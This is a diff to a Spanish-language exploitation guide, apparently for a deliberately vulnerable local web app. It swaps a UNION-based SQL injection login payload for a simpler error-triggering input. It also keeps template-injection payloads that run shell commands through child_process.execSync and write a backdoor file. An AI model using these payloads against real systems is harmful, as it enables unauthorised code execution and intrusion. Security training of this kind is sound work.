@@ -86,7 +86,7 @@ http://localhost:3000
 2. Usar usuario básico: `user` / `user123`
 3. Interceptar la petición de login y modificar el username:
    ```
-   Username: admin' OR '1'='1' UNION SELECT * FROM sqlite_master--
+   Username: user'asd'
    ```
 4. **Resultado**: Error SQL que expone:
    - Ruta de la base de datos: `backend/files/db/g3.db`
@@ -148,15 +148,11 @@ http://localhost:3000
 **Procedimiento**:
 1. Con privilegios de admin, ir a **"Ver documentos"**
 2. Seleccionar cualquier archivo PDF
-3. En el sistema de comentarios, usar referencias con código malicioso:
-   ```javascript
-   Hola {{uploader}}, info del servidor: {{process.platform}} {{process.version}}
-   ```
-4. **Escalación a RCE completo**:
+3. **Escalación a RCE completo**:
    ```javascript
    {{require('child_process').execSync('whoami').toString()}}
    ```
-5. **Crear backdoor**:
+4. **Crear backdoor**:
    ```javascript
    {{require('fs').writeFileSync('backdoor.js', 'console.log("Server compromised!")')}}
    ```
